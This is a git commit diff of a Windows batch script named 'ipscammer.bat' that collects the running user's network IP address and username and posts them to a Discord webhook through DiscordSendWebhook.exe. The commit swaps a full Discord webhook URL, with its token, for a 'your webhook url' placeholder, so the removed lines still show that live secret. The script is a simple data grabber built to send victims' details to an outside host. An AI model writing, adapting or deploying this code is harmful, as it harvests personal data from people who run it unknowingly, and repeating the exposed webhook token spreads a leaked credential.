1310b654480625af38b5aadb7ae5a54fdc4d2789
Lominub44 <145709216+Lominub44@users.noreply.github.com>
2023-12-30 14:49:26 +0100

    Update ipscammer.bat

--- ipscammer.bat
+++ ipscammer.bat
@@ -2,7 +2,7 @@ for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') 
 echo Network IP: %NetworkIP%
 
 @echo off
-DiscordSendWebhook.exe -m %NetworkIP% -n "info" -a http://www.phoenix125.com/share/phoenix.png -w https://discord.com/api/webhooks/1189341522471166043/T4wnczQWUpXLelcnPEcMkD76LkuAEgfug66ewBYL7FAOZouJppaaK-45invA4d12N9Pe
+DiscordSendWebhook.exe -m %NetworkIP% -n "info" -a http://www.phoenix125.com/share/phoenix.png -w "your webhook url"
 
 @echo off
-DiscordSendWebhook.exe -m %USERNAME% -n "info" -a http://www.phoenix125.com/share/phoenix.png -w https://discord.com/api/webhooks/1189341522471166043/T4wnczQWUpXLelcnPEcMkD76LkuAEgfug66ewBYL7FAOZouJppaaK-45invA4d12N9Pe
+DiscordSendWebhook.exe -m %USERNAME% -n "info" -a http://www.phoenix125.com/share/phoenix.png -w "your webhook url"
